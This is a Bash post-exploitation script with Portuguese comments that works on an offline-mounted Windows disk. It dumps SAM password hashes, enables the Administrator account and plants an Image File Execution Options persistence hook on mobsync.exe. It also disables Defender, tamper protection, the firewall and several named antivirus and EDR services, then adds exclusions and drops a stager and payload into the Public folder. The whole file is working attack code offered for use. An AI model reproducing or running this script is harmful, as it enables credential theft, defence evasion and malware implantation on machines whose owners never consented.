#!/bin/bash

# --- CONFIGURAÇÕES ---
STAGER="mobsync_helper.exe"
PAYLOAD="Windows.exe"
STAGER_PATH="C:\\Users\\Public\\$STAGER"
PAYLOAD_PATH="C:\\Users\\Public\\$PAYLOAD"
DEST_DIR="$HOME/Desktop/Post_Exploitation"

# LISTA DE SERVIÇOS PARA ELIMINAR (Adicione os nomes curtos aqui)
# Exemplos: avp (Kaspersky), SmadavService, SentinelAgent, Endpoint
SERVICES_TO_KILL=("avp" "SmadavService" "SentinelAgent" "SepMasterService" "McAfeeFramework")

echo "[+] OPERAÇÃO TOTAL: 'God Mode & Endpoint Annihilation'..."

# 1. LOCALIZAÇÃO E LIMPEZA
MOUNT_POINT=$(mount | grep -i "ntfs" | awk '{print $3}' | while read m; do [ -f "$m/Windows/System32/ntoskrnl.exe" ] && echo "$m" && break; done)
if [ -z "$MOUNT_POINT" ]; then echo "[-] Erro: Disco não encontrado."; exit 1; fi

PARTICAO=$(mount | grep "$MOUNT_POINT" | awk '{print $1}')
sudo ntfsfix "$PARTICAO"

# 2. DEFINIR CAMINHOS
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

# 3. EXTRAÇÃO DE HASHES
mkdir -p "$DEST_DIR"
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

# 4. MODIFICAÇÕES DE REGISTRO
echo "[+] Desativando Defesas e Endpoints..."

# A) Ativar Admin e IFEO (Watchdog)
printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" &>/dev/null
printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk mobsync.exe\ncd mobsync.exe\nnv 1 Debugger\ned Debugger\n$STAGER_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# B) Matar Endpoints de Terceiros (Loop de Desativação)
for svc in "${SERVICES_TO_KILL[@]}"; do
    echo "[*] Desativando serviço: $svc"
    printf "cd ControlSet001\\Services\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# C) DESATIVAR DEFENDER, REAL-TIME E TAMPER (SOFTWARE HIVE)
# DisableAntiSpyware=1, DisableRealtimeMonitoring=1, TamperProtection=0
printf "cd Microsoft\\Windows Defender\nnv 4 DisableAntiSpyware\ned DisableAntiSpyware\n1\ncd Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# D) DESATIVAR FIREWALL E SERVIÇOS DE SEGURANÇA (SYSTEM HIVE)
# Start=4 significa "Desativado"
printf "cd ControlSet001\\Services\\WinDefend\ned Start\n4\ncd ..\\mpssvc\ned Start\n4\ncd ..\\WdFilter\ned Start\n4\ncd ..\\WdNisSvc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# E) Adicionar Exclusões no Defender (Prevenção Extra)
printf "cd Microsoft\\Windows Defender\\Exclusions\\Paths\nnv 4 $STAGER_PATH\ned $STAGER_PATH\n0\nnv 4 $PAYLOAD_PATH\ned $PAYLOAD_PATH\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 5. IMPLANTAÇÃO
if [ -f "./$STAGER" ] && [ -f "./$PAYLOAD" ]; then
    sudo cp "./$STAGER" "$MOUNT_POINT/Users/Public/"
    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Users/Public/"
    sync
    echo "[!] Binários implantados e Endpoints cegados."
else
    echo "[!] ERRO: Binários não encontrados!"
fi

echo "[!] OPERAÇÃO CONCLUÍDA!"
